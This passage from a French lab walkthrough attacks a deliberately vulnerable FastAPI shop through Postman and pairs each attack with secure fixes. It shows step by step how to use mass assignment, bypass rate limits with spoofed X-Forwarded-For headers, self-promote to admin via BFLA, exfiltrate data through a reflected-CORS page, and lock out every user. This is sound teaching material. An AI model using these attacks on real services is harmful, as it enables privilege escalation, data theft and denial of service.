**Réponse :**
```json
{
  "id": 666,
  "name": "Cheap used iFone",
  "description": "New product compliant with regulations",
  "blocked": false,
  "seller": {...},
  "stock": 1
}
```

**Attaque Mass Assignment réussie :** L'API a accepté aveuglément le champ `blocked` et l'a mis à jour en base de données. Le produit est maintenant débloqué et peut être vendu.

**Pourquoi ça fonctionne ?**

Code vulnérable typique :
```python
@router.patch("/products/{product_id}")
def update_product(product_id: int, product_update: dict, ...):
    product = db.query(Product).filter(Product.id == product_id).first()
    
    # Mise à jour aveugle : tous les champs du dict sont appliqués
    for key, value in product_update.items():
        setattr(product, key, value)
    
    db.commit()
    return product
```

**Mesure de sécurité : Schéma Pydantic strict**

**1. Définir explicitement les champs modifiables :**
```python
class ProductUpdateSecure(BaseModel):
    name: Optional[str] = None
    price: Optional[float] = None
    description: Optional[str] = None
    # Le champ 'blocked' est ABSENT = non modifiable
```

**2. Utiliser ce schéma dans l'endpoint :**
```python
@router.patch("/products/{product_id}")
def update_product(
    product_id: int,
    product_update: ProductUpdateSecure,  # Schéma strict
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    product = db.query(Product).filter(Product.id == product_id).first()
    
    # Vérification : l'utilisateur est-il le vendeur ?
    if product.seller_id != current_user.id:
        raise HTTPException(status_code=403, detail="Not your product")
    
    # Mise à jour UNIQUEMENT des champs autorisés
    update_data = product_update.dict(exclude_unset=True)
    for key, value in update_data.items():
        setattr(product, key, value)
    
    db.commit()
    return product
```

**Résultat :** Si l'attaquant tente d'envoyer `{"blocked": false}`, FastAPI ignore ce champ ou retourne une erreur de validation. La propriété `blocked` reste protégée et ne peut être modifiée que par un endpoint administratif dédié.

---

## PHASE 3 : Business Logic & Privileges

**Objectif :** Exploiter des failles logiques pour automatiser des attaques et s'octroyer des privilèges administratifs.

### 05 - API6 : Unrestricted Access to Sensitive Business Flows (Scalper)

#### Contexte

Un produit rare est en vente limitée sur la plateforme :

```json
{
  "id": 999,
  "name": "PlayStati 6 - Limited Edition",
  "price": 899.99,
  "description": "The console everyone wants. Ultra-limited stock!",
  "stock": 11
}
```

L'attaquant souhaite accaparer tout le stock pour le revendre plus cher (attaque de **Scalping**).

---
#### Request 5.1 : Check target product stock

**Requête :**
```
GET {{base_url}}/orders/999
```

**Objectif :**
Observer combien de stock il reste du produit.

**Action dans Postman :**
1. Sélectionner la requête "Request 5.1 : Check target product stock"
2. Examiner le corps de la requête
3. Cliquer sur "Send"


**Réponse :**
```json
{
    "id": 999,
    "name": "PlayStati 6 - Limited Edition",
    "price": 899.99,
    "description": "The console everyone wants. Ultra-limited stock!",
    "blocked": false,
    "seller": {
        "id": 1,
        "username": "admin",
        "email": "admin@shop.com",
        "role": "admin",
        "phone": "0322335359",
        "address": "146, rue Nicole Maury\n30742 Chauveau"
    },
    "stock": 11
}
```

Il reste 11 produits en stock.

---

#### Request 5.2 : Trying to buy with same account (x2)

**Requête :**
```
POST {{base_url}}/orders
```

**Objectif :**
Premier achat légitime du produit rare.

**Action dans Postman :**
1. Sélectionner la requête "Request 5.1 : First purchase attempt"
2. Examiner le corps de la requête
3. Token d'authentification : {{attacker_token}}
4. Cliquer sur "Send"

**Corps de la requête :**
```json
{
  "product_id": 999,
  "quantity": 1
}
```

**Réponse :**
```
200 OK
```

Le premier achat fonctionne. On essaie une deuxième fois de lancer cette requête, pour tester s'il y a une limitation de quota par utilisateur.


**Réponse :**
```json
{
  "detail": "Quota exceeded: maximum 1 item per customer."
}
```

**Protection détectée :** Quota de 1 produit par utilisateur.

**Stratégie de contournement :** Créer plusieurs comptes utilisateurs.

---

#### Request 5.3 : Create second account

**Requête :**
```
POST {{base_url}}/auth/register
```

**Objectif :**
Créer un deuxième compte pour contourner le quota.

**Action dans Postman :**
1. Sélectionner la requête "Request 5.3 : Create second account"
2. Examiner le corps de la requête
3. Cliquer sur "Send"

**Corps de la requête :**
```json
{
  "username": "bot",
  "email": "bott@fake.com",
  "password": "password123"
}
```

**Réponse :**
```
200 OK
```

Le compte est créé avec succès.

---

#### Request 5.4 : Trying to create 2nd account with same IP

**Requête :**
```
POST {{base_url}}/auth/register
```

**Objectif :**
Tenter de créer rapidement un troisième compte.

**Action dans Postman :**
1. Sélectionner la requête 5.4
2. Cliquer sur "Send" 

**Réponse :**
```json
{
  "error": "Rate limit exceeded: 1 per 1 hour"
}
```

**Protection détectée :** Rate limiting basé sur l'IP (1 inscription par heure).

**Stratégie de contournement :** Falsifier l'adresse IP.

---

#### Request 5.5 : Test with fake IP

**Requête :**
```
POST {{base_url}}/auth/register
```

**Objectif :**
Contourner le rate limiting en utilisant une autre adresse IP. Ici, nous n'avons pas d'autre IP à disposition, nous utilisons donc un faux header IP. Nous avons implémenté l'API de sorte à ce qu'elle pense que le header IP est la réelle adresse IP, afin de mener à bien cette attaque. En réalité, il n'est pas possible de changer son adresse IP de la sorte.

**Action dans Postman :**
1. Sélectionner la requête "Request 5.5 : Test with fake IP"
2. Ouvrir l'onglet "Headers"
3. Remarquez le header `X-Forwarded-For: 192.168.1.100`
4. Cliquer sur "Send"

**Headers supplémentaires :**
```
X-Forwarded-For: 192.168.1.100
```

**Corps de la requête :**
```json
{
  "username": "bot00",
  "email": "bot1@fake.com",
  "password": "password123"
}
```

**Réponse :**
```
200 OK
```

**Vulnérabilité identifiée :** L'attaquant peut contourner le rate limiting en utilisant différentes adresses IP pour créer des comptes.

---

Les requêtes 5.6 et 5.7 permettent au nouveau compte de se connecter et d'acheter un produit sur ce compte là, sans souci de quota.

#### Request 5.8 : Launch Scalper Attack (Distributed bots)

**Requête :**
```
POST {{base_url}}/auth/register
```

**Objectif :**
Lancer un script automatisé qui crée 20 comptes fictifs, chacun avec une fausse IP, puis achète le produit rare avec chaque compte.

**Action dans Postman :**
1. Sélectionner la requête "Request 5.8 : Launch Scalper Attack"
2. Ouvrir l'onglet "Tests" pour voir le script
3. Ouvrir la Console Postman
4. Cliquer sur "Send"

**Script d'attaque (visible dans l'onglet "Tests")**

**Résultats à lire dans la Console Postman**


**Vérification du stock :**

Après l'attaque, vérifiez manuellement :
```
GET {{base_url}}/products/999
```

**Réponse :**
```json
{
  "id": 999,
  "name": "PlayStati 6 - Limited Edition",
  "stock": 0
}
```

**Attaque réussie :** L'attaquant a vidé le stock du produit rare en quelques secondes grâce à l'automatisation. Les vrais clients ne peuvent plus acheter le produit.

**Mesures de sécurité dans l'API sécurisée :**

**1. CAPTCHA à l'inscription :**
```python
class UserCreate(BaseModel):
    username: str
    password: str
    email: EmailStr
    captcha_answer: int  # Champ obligatoire

@router.post("/auth/register")
def register_user(request: Request, user: UserCreate, db: Session = Depends(get_db)):
    # Vérification CAPTCHA
    if user.captcha_answer != 8:  # Exemple : 5 + 3 = ?
        raise HTTPException(
            status_code=400,
            detail="Invalid CAPTCHA. Are you a robot?"
        )
    # Suite de l'inscription...
```
Bien que notre implémentation soit rudimentaire (une question statique demandant le résultat de $5+3$), elle illustre le principe de défense : imposer un coût interactif à l'utilisateur lors de la création de compte. Intégrée au processus d'inscription, cette vérification bloque efficacement les scripts d'automatisation basiques, rendant l'attaque de scalping inopérante.
Il est important de noter que si les CAPTCHAs modernes peuvent être contournés (via des services de résolution tiers ou de l'IA), ils constituent néanmoins une première ligne de défense indispensable pour ralentir l'attaquant.
Dans une implémentation réelle, utilisez reCAPTCHA v3, hCaptcha ou un challenge de type Arkose Labs.

---

### 06 - API5 : Broken Function Level Authorization (BFLA)

**Objectif :** Accéder aux fonctionnalités administratives sans être administrateur, puis s'auto-promouvoir.

#### Request 6.1 : Get all users

**Requête :**
```
GET {{base_url}}/admin/users
```

**Objectif :**
Accéder à la liste complète des utilisateurs avec un token de simple utilisateur.

**Action dans Postman :**
1. Sélectionner la requête "Request 6.1 : Get all users"
2. Vérifier que le Header "Authorization" contient `{{attacker_token}}` (token simple utilisateur)
3. Cliquer sur "Send"

**Header :**
```
Authorization: Bearer {{attacker_token}}
```

L'attaquant utilise son token de simple utilisateur, pas un token admin.

**Réponse attendue (API vulnérable) :**
```json
[
  {
    "id": 1,
    "username": "admin",
    "email": "admin@shop.com",
    "role": "admin",
    "blocked": 0
  },
  {
    "id": 2,
    "username": "user1",
    "email": "perretvincent@example.com",
    "role": "user",
    "blocked": 0
  },
  {
    "id": 3,
    "username": "user2",
    "email": "theodoreguillaume@example.com",
    "role": "user",
    "blocked": 0
  }
]
```

**Vulnérabilité BFLA critique :** L'endpoint admin est accessible par un simple utilisateur. L'API vérifie l'authentification mais pas l'autorisation (rôle).

**Informations stratégiques collectées :**
- Liste complète des utilisateurs et leurs emails
- Identification des administrateurs (`"role": "admin"`)
- Cibles pour phishing ou usurpation d'identité

---

#### Request 6.2 : Get all orders

**Requête :**
```
GET {{base_url}}/admin/orders
```

**Objectif :**
Accéder à toutes les commandes de la plateforme.

**Action dans Postman :**
1. Sélectionner la requête "Request 6.2 : Get all orders"
2. Cliquer sur "Send"

**Réponse :**
```json
[
  {
    "id": 1,
    "quantity": 3,
    "buyer_id": 1,
    "product_id": 13,
    "created_at": "2026-01-24T00:03:18.222613"
  },
  {
    "id": 2,
    "quantity": 1,
    "buyer_id": 5,
    "product_id": 10,
    "created_at": "2026-01-24T00:03:18.222620"
  }
]
```

Accès à toutes les transactions commerciales de la plateforme.

---

#### Request 6.3 : Delete user

**Requête :**
```
DELETE {{base_url}}/admin/users/10
```

**Objectif :**
Supprimer arbitrairement un compte utilisateur.

**Action dans Postman :**
1. Sélectionner la requête "Request 6.3 : Delete user"
2. Cliquer sur "Send"

**Réponse :**
```json
{
  "message": "User ID:10 successfully 'deleted'",
  "deleted_by": "badguy"
}
```

**Impact majeur :** L'attaquant peut supprimer arbitrairement n'importe quel compte utilisateur, causant une perte de données et un déni de service pour les victimes.

---

### Request 6.4 : Access contact form

**Requête :**
```
GET {{base_url}}/admin/messages
```

**Objectif :**
Tenter d'accéder aux messages envoyés via le formulaire de contact.

**Action dans Postman :**
1. Sélectionner la requête "Request 6.4 : Access contact form"
2. Cliquer sur "Send"

**Header :**
```
Authorization: Bearer {{attacker_token}}
```

**Réponse (API vulnérable) :**
```
403 Forbidden
```
```json
{
  "detail": "Accès réservé aux administrateurs"
}
```

**Exception : Protection correctement implémentée**

Contrairement aux autres endpoints admin, celui-ci implémente correctement une vérification du rôle (RBAC) avant de traiter la demande.

**Observation :** Cet endpoint de l'API vulnérable montre qu'une vérification de rôle est techniquement possible, mais qu'elle n'a simplement pas été appliquée systématiquement sur les autres routes administratives.

---

### Request 6.5 : Access private stats

**Requête :**
```
GET {{base_url}}/admin/stats
```

**Objectif :**
Accéder à des statistiques sensibles sur l'entreprise.

**Action dans Postman :**
1. Sélectionner la requête "Request 6.5 : Access private stats"
2. Ouvrir l'onglet "Headers"
3. Remarquez le header `X-Forwarded-For: 1.2.3.4`
4. Cliquer sur "Send"

**Headers :**
```
Authorization: Bearer {{attacker_token}}
X-Forwarded-For: 1.2.3.4
```

**Réponse (API vulnérable) :**
```
403 Forbidden
```
```json
{
  "detail": "Firewall Block: Access denied from external IP (1.2.3.4). Internal network only."
}
```

**Exception : Restriction par IP**

Cet endpoint présente un comportement différent. Il rejette la connexion sur la base de l'origine réseau. Cet endpoint est conçu pour n'être accessible que depuis le réseau interne de l'entreprise.

**Note technique :** Dans notre environnement de test local, le client et le serveur communiquent via l'interface de boucle locale (localhost), ce qui signifie que l'IP réelle est `127.0.0.1` (autorisée). Pour les besoins de la démonstration et simuler un attaquant externe, nous avons forcé l'injection de l'en-tête `X-Forwarded-For: 1.2.3.4`. Le serveur, configuré pour faire confiance à cet en-tête, bloque alors la requête, pensant qu'elle provient de l'extérieur.

**Implication :** L'attaquant devra trouver un autre moyen d'accéder à ces données sensibles. Cette tentative sera explorée dans une phase ultérieure via une attaque CORS.

---

### Request 6.6 : Promote attacker to admin

**Requête :**
```
POST {{base_url}}/admin/promote/{{attacker_id}}
```

**Objectif :**
S'auto-promouvoir au rôle administrateur en exploitant la faille BFLA.

**Action dans Postman :**
1. Sélectionner la requête "Request 6.6 : Promote attacker to admin"
2. Notez que l'URL utilise la variable `{{attacker_id}}` qui contient `666`
3. Vérifier le Header "Authorization"
4. Cliquer sur "Send"

**Header :**
```
Authorization: Bearer {{attacker_token}}
```

**Réponse (API vulnérable) :**
```json
{
  "message": "Success: User badguy (ID 666) is now ADMIN.",
  "promoted_by": "badguy",
  "warning": "Please log in again to get a new token."
}
```

**Élévation de privilèges réussie :** L'utilisateur `badguy` est désormais administrateur légitime aux yeux du système.

**Conséquences :**
- Persistance de l'accès (même si les failles BFLA sont corrigées)
- Accès officiel à toutes les fonctionnalités admin
- Capacité à promouvoir d'autres utilisateurs
- Contrôle total du système

---

#### Request 6.7 : Login Attacker to get Admin Token

**Reconnexion pour obtenir le nouveau token :**

Après la promotion, il faut se reconnecter pour obtenir un token avec le rôle admin :

```
POST {{base_url}}/auth/login
```

Corps :
```json
{
  "username": "badguy",
  "password": "thisismypwd!"
}
```

Réponse :
```json
{
  "access_token": "...",
  "token_type": "bearer",
  "user_id": 666,
  "role": "admin"  ← Rôle admin confirmé
}
```

**Élévation de privilèges réussie :** L'attaquant est désormais administrateur légitime du système avec un accès total.

**Mesures de sécurité dans l'API sécurisée :**

**1. Dépendance centralisée pour la vérification admin :**
```python
def get_current_admin(current_user: User = Depends(get_current_user)) -> User:
    if current_user.role != "admin":
        raise HTTPException(
            status_code=403,
            detail="Access denied. Administrator privileges required."
        )
    return current_user
```

**Résultat :** Tentative d'accès par un non-admin → `403 Forbidden : Access denied. Administrator privileges required.`

---

## PHASE 4 : Infrastructure Weaknesses and Availability

**Objectif :** Exfiltrer des données hautement sensibles via des failles de configuration et provoquer un déni de service généralisé.

---

### 07 - API8 : Security Misconfiguration (CORS)

**Contexte**

Désormais administrateur (grâce à la Request 6.6), l'attaquant va retenter d'accéder aux endpoints posant problème précédemment, puis exploiter des failles de configuration pour porter atteinte à la disponibilité du service.

---

#### Request 7.1 : Second try to access private stats

**Requête :**
```
GET {{base_url}}/admin/stats
```

**Objectif :**
Avec les privilèges admin nouvellement acquis, l'attaquant retente d'accéder aux statistiques privées.

**Action dans Postman :**
1. Sélectionner la requête "Request 7.1 : Second try to access private stats"
2. Vérifier que le Header "Authorization" contient `{{admin_attacker_token}}`
3. Remarquer les headers `X-Forwarded-For` et `User-Agent`
4. Cliquer sur "Send"

**Headers :**
```
Authorization: Bearer {{admin_attacker_token}}
X-Forwarded-For: 1.2.3.4
User-Agent: PostmanRuntime/Fuzzer
```

**Réponse :**
```
403 Forbidden
```
```json
{
  "detail": "Firewall Block: Access denied from external IP (1.2.3.4). Internal network only."
}
```

**Observation :** Même avec des privilèges administrateur, l'accès est refusé. Cet endpoint est protégé par une restriction IP : seules les connexions depuis le réseau interne de l'entreprise sont autorisées.

**Stratégie de contournement :** Puisque l'accès direct est impossible, l'attaquant va concevoir une attaque indirecte en piégeant un administrateur légitime (connecté au réseau interne) pour qu'il effectue la requête à sa place.

---

#### Request 7.2 : Revealing CORS misconfiguration

**Requête :**
```
OPTIONS {{base_url}}/admin/stats
```

**Objectif :**
Vérifier si le serveur autorise les requêtes cross-origin depuis n'importe quel domaine (vulnérabilité CORS).

**Action dans Postman :**
1. Sélectionner la requête "Request 7.2 : Revealing CORS misconfiguration"
2. Ouvrir l'onglet "Headers"
3. Examiner les headers personnalisés
4. Cliquer sur "Send"
5. Examiner les headers de la **réponse**

**Headers de la requête :**
```
Authorization: Bearer {{admin_attacker_token}}
X-Forwarded-For: 1.2.3.4
Origin: http://evil-hacker.com
Access-Control-Request-Method: GET
```

**Explication de la requête OPTIONS :**

Il s'agit d'une **requête de pré-vérification CORS** (Preflight). Avant qu'un navigateur n'autorise un script JavaScript à lire les données d'une API cross-origin, il envoie d'abord une requête OPTIONS pour vérifier si le serveur autorise :
- L'origine demandée (le domaine du site malveillant)
- La méthode HTTP (GET, POST, etc.)
- L'envoi de credentials (cookies, tokens)

**Headers de la réponse (à examiner dans Postman) :**
```
date: Sat, 24 Jan 2026 02:20:12 GMT
server: uvicorn
vary: Origin
access-control-allow-methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT
access-control-allow-credentials: true
access-control-allow-origin: http://evil-hacker.com
content-type: text/plain; charset=utf-8
```

**Analyse de la vulnérabilité :**

Le header critique à observer :
```
access-control-allow-origin: http://evil-hacker.com
```

**Vulnérabilité CORS critique détectée :**
- Le serveur reflète exactement l'origine envoyée → Accepte TOUS les domaines
- Cette configuration permet à n'importe quel site web malveillant de faire des requêtes authentifiées à l'API au nom de l'utilisateur

**Code vulnérable :**
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Accepte TOUTES les origines
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**Note technique :** Quand `allow_credentials=True`, le standard CORS interdit de renvoyer littéralement `*`. Le framework contourne cela en reflétant dynamiquement l'origine de la requête, ce qui revient au même problème de sécurité.

Ayant découvert cette vulnérabilité cruciale, l'attaquant passe à l'action. Il envoie un email de phishing à l'administrateur ciblé, l'incitant à cliquer sur un lien vers une page piégée. Lorsque l'administrateur clique, son navigateur charge la page malveillante. 
Pour simuler le piège tendu à l'administrateur, ouvrez simplement le fichier attack/api8_cors_attacks.html dans votre navigateur (double-clic). En ouvrant ce fichier localement, votre navigateur effectue la requête depuis la machine hôte (127.0.0.1). L'API considère donc que la requête provient du réseau interne de confiance, ce qui permet de contourner le pare-feu IP (simulé) et de valider le scénario d'attaque.

Un script JavaScript s'exécute alors en arrière-plan :
    - Il effectue une requête GET /admin/stats vers l'API. Comme l'administrateur est connecté au réseau interne, le pare-feu laisse passer la requête. Comme il est authentifié, ses cookies sont envoyés.
    - Le navigateur reçoit la réponse contenant les données sensibles. Grâce à la mauvaise configuration CORS vue plus haut, le navigateur accepte de livrer ces données au script malveillant.
    - Le script exfiltre ensuite ces données en les postant automatiquement sur le formulaire de contact public de l'API via POST /contact.

L'attaquant, qui s'est promu administrateur précédemment, n'a plus qu'à consulter les messages reçus via l'endpoint GET /admin/messages.

---

#### Request 7.3 : Read private stats sent to contact

**Requête :**
```
GET {{base_url}}/admin/messages
```

**Objectif :**
Récupérer les données confidentielles exfiltrées via l'attaque CORS précédente.

**Action dans Postman :**
1. **Important :** Cette requête simule la fin d'une attaque complexe
2. Sélectionner la requête "Request 7.3 : Read private stats sent to contact"
3. Cliquer sur "Send"

**Headers :**
```
Authorization: Bearer {{admin_attacker_token}}
X-Forwarded-For: 1.2.3.4
User-Agent: PostmanRuntime/Fuzzer
```

**Réponse (extrait des messages) :**
```json
[
  {
    "email": "badguy@free.fr",
    "content": "Private stats: {\n  \"status\": \"CONFIDENTIAL\",\n  \"total_revenue\": 154300.5,\n  \"active_carts\": 42,\n  \"buyer\": \"The President\",\n  \"server_load\": \"12%\",\n  \"top_selling_product\": \"iPhone 16\"\n}"
  }
]
```

**Attaque CORS réussie :** L'attaquant a contourné la restriction IP et exfiltré des données hautement confidentielles :
- Chiffre d'affaires total : 154 300,50€
- Identité d'acheteurs VIP (le Président de la République)
- Statistiques internes de charge serveur
- Produit le plus vendu

**Mesure de sécurité dans l'API sécurisée :**

```python
# Configuration CORS stricte
origins = [] 
app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
)
```

**Résultat :** Le serveur ne fait confiance à aucune origine externe. Seuls les domaines légitimes de la boutique peuvent effectuer des requêtes cross-origin.

---

### 08 - API4 : Unrestricted Resource Consumption (DoS)

**Contexte**

Pour parachever son attaque, l'attaquant décide de provoquer un déni de service. Son objectif n'est pas de faire tomber le serveur par surcharge (DDoS classique), mais d'empêcher légitimement les utilisateurs d'accéder à leurs comptes via un **Déni de Service Logique**.

---

#### Request 8.1 : Get user id

**Requête :**
```
GET {{base_url}}/admin/users
```

**Objectif :**
Récupérer la liste de tous les utilisateurs pour identifier les cibles du déni de service.

**Action dans Postman :**
1. Sélectionner la requête "Request 8.1 : Get user id"
2. Ouvrir la Console Postman
3. Cliquer sur "Send"

**Header :**
```
Authorization: Bearer {{attacker_token}}
```

**Script Post-Response (visible dans l'onglet "Tests") :**

```javascript
if (pm.response.code === 200) {
    var users = pm.response.json();
    if (users.length > 0) {
        var firstUser = users[0];
        var firstUserId = firstUser.id;
        pm.environment.set("user_id", firstUserId);
        console.log("First user retrieved");
        console.log("  - ID: " + firstUserId);
        console.log("  - Username: " + firstUser.username);
        console.log("  - Email: " + firstUser.email);
        console.log("  - Role: " + firstUser.role);
        console.log("  - Blocked: " + firstUser.blocked);
    } else {
        console.log("No users found");
    }
} else {
    console.log("Error: " + pm.response.code);
}
```

**Résultat dans la Console :**
```
First user retrieved
  - ID: 1
  - Username: admin
  - Email: admin@shop.com
  - Role: admin
  - Blocked: 0
```

**Observation :** L'attaquant a récupéré la liste complète des utilisateurs. Il va maintenant les bloquer massivement.

---

#### Request 8.2 : Modify blocked value

**Requête :**
```
PATCH {{base_url}}/users/2
```

**Objectif :**
Tester le mécanisme de blocage sur un seul utilisateur avant l'attaque massive.

**Action dans Postman :**
1. Sélectionner la requête "Request 8.2 : Modify blocked value"
2. Examiner le corps de la requête dans l'onglet "Body"
3. Ouvrir la Console Postman
4. Cliquer sur "Send"

**Header :**
```
Authorization: Bearer {{attacker_token}}
```

**Corps de la requête :**
```json
{
  "blocked": 9999999999
}
```

**Explication du timestamp :**

La valeur `9999999999` est un timestamp Unix qui correspond à :
- **Date : 16 novembre 2286**
- L'utilisateur sera bloqué pendant plus de 260 ans

**Script Post-Response :**
```javascript
if (pm.response.code === 200) {
    var user = pm.response.json();
    console.log("User blocked successfully");
    console.log("  - ID: " + user.id);
    console.log("  - Username: " + user.username);
    console.log("  - Blocked timestamp: " + user.blocked);
    console.log("  - Unblock date: November 16, 2286");
} else {
    console.log("Error during blocking: " + pm.response.code);
    console.log(pm.response.text());
}
```

**Réponse :**
```json
{
  "id": 2,
  "username": "user1",
  "email": "user1@example.com",
  "role": "user",
  "blocked": 9999999999
}
```

**Résultat dans la Console :**
```
User blocked successfully
  - ID: 2
  - Username: user1
  - Blocked timestamp: 9999999999
  - Unblock date: November 16, 2286
```

**Vulnérabilité Mass Assignment confirmée :** L'API accepte la modification du champ `blocked` sans vérifier si l'utilisateur a le droit de modifier ce champ critique.

---

#### Request 8.3 : Block all users

**Requête :**
```
GET {{base_url}}/admin/users
```

**Objectif :**
Bloquer massivement tous les utilisateurs de la plateforme (sauf l'attaquant).

**Action dans Postman :**
1. Sélectionner la requête "Request 8.3 : Block all users"
2. Ouvrir l'onglet "Tests" pour voir le script d'attaque
3. Ouvrir la Console Postman et la glisser vers le haut pour bien voir les résultats
4. Cliquer sur "Send"

**Header :**
```
Authorization: Bearer {{attacker_token}}
```

**Script d'attaque automatisée (visible dans l'onglet "Tests")**

**Fonctionnement du script :**

1. Récupère la liste de tous les utilisateurs
2. Parcourt chaque utilisateur
3. Exclut l'attaquant (ID 666)
4. Pour chaque victime :
   - Envoie une requête PATCH `/users/{id}`
   - Injecte `"blocked": 9999999999`

**Résultat dans la Console :**

```
[START] DoS Attack (Except ID 666)
-> SKIP: User badguy (ID 666) is the attacker.
-> BLOCKED: admin (ID: 1)
-> BLOCKED: user1 (ID: 2)
-> BLOCKED: user2 (ID: 3)
-> BLOCKED: user3 (ID: 4)
-> BLOCKED: user4 (ID: 5)
...
```

**Attaque réussie :** Tous les utilisateurs (sauf l'attaquant) sont maintenant bloqués jusqu'en 2286.

---

#### Request 8.4 : Login Simple User Impossible

**Requête :**
```
POST {{base_url}}/auth/login
```

**Objectif :**
Vérifier qu'un utilisateur légitime bloqué ne peut plus se connecter.

**Action dans Postman :**
1. Sélectionner la requête "Request 8.4 : Login Simple User Impossible"
2. Examiner le corps de la requête
3. Cliquer sur "Send"

**Corps de la requête :**
```json
{
  "username": "user1",
  "password": "password123"
}
```

**Réponse :**
```
403 Forbidden
```
```json
{
  "detail": "Account locked until 9999999999"
}
```

**Déni de Service Logique confirmé :** Le système fonctionne techniquement, mais il est rendu inutilisable pour ses clients légitimes.

**Impact :**
- Tous les clients ne peuvent plus se connecter
- Perte de chiffre d'affaires
- Atteinte à la réputation
- Service rendu inutilisable

**Mesure de sécurité dans l'API sécurisée :**

**Schéma Pydantic strict :**
```python
class UserUpdateSecure(BaseModel):
    email: Optional[EmailStr] = None
    phone: Optional[str] = None
    address: Optional[str] = None
    current_password: Optional[str] = None
    # Le champ 'blocked' est ABSENT = non modifiable par les utilisateurs
```

**Résultat :** Toute tentative d'injection du champ `blocked` est automatiquement ignorée par FastAPI. Seul un endpoint administratif dédié peut modifier ce champ.

---

## Tester l'API Sécurisée

Si vous souhaitez tester que les corrections mises en place fonctionnent bien, vous pouvez relancer les requêtes précédentes cette fois sur l'API sécurisée. Pour cela :

1. **Changez la variable d'environnement `base_url` vers `http://localhost:8001`**
2. **Supprimez les autres variables remplies auparavant (à part `base_url` et `admin_url`)**
3. **Tentez de relancer les attaques critiques** (Forge Token, BOLA, Scalper, DoS)

### Résultats attendus

- **401 Unauthorized** : Signature de token invalide
- **403 Forbidden** : Accès refusé aux ressources d'autrui ou admin
- **422 Unprocessable Entity** : Requête 5.5 : CAPTCHA manquant -> le format de données envoyé est incorrect
- **400 Bad Request** : Requête 5.8 : Le CAPTCHA est présent mais n'est pas correct (envoyé dans le script de Scalping, lors des inscriptions des bots)
- **429 Too Many Requests** : Le Rate Limiting bloque les attaques brutes
- **405 Method Not Allowed** : La modification du champ "blocked" des utilisateurs n'est pas possible car la méthode PATCH sur l'endpoint users/{id} n'existe plus, c'est seulement PATCH users/me qui existe


### Endpoints supprimés ou modifiés

Certains endpoints n'existent plus dans l'API sécurisée, comme `GET {{base_url}}/orders/user/{id}` (remplacé par un endpoint `/me`), ou bien `GET {{base_url}}/openapi.json` (plus accessible). Vous obtiendrez alors la réponse **404 Not Found**.

### Vérification de la protection CORS (API8)

Par défaut, le script d'attaque attacks/api8_cors_attacks.html vise l'API vulnérable (Port 8000) et l'attaque réussit (les données s'affichent).

Pour vérifier que la version sécurisée bloque bien cette attaque, vous devez modifier la cible dans le fichier HTML :

    Ouvrez le fichier attacks/api8_cors_attacks.html dans un éditeur de texte.

    Modifiez la variable PORT pour viser l'API sécurisée :
    JavaScript

    // Avant (Vulnérable)
    const PORT = '8000';

    // Après (Sécurisé)
    const PORT = '8001';

    Ouvrez le fichier dans votre navigateur.

    Résultat attendu : Aucune donnée ne s'affiche. En ouvrant la console du navigateur (F12), vous verrez une erreur rouge, confirmant que la protection est active. Un 404 Not Found est également présent car l'endpoint visé est /admin/stats au lieu de /management-7f8a9d1c-3b2e-4a1f pour l'API sécurisée.

### Requêtes admin (6.1 à 6.6)

En ce qui concerne les requêtes 6.1 à 6.6 qui testent les endpoints admin, vous devez changer l'URL `{{base_url}}/admin/...` en `{{base_url}}{{admin_url}}/...`.

En effet, dans la version sécurisée, les endpoints admin sont accessibles via une URL difficile à prévoir, qui a été enregistrée dans l'environnement Postman dans la variable `admin_url`.
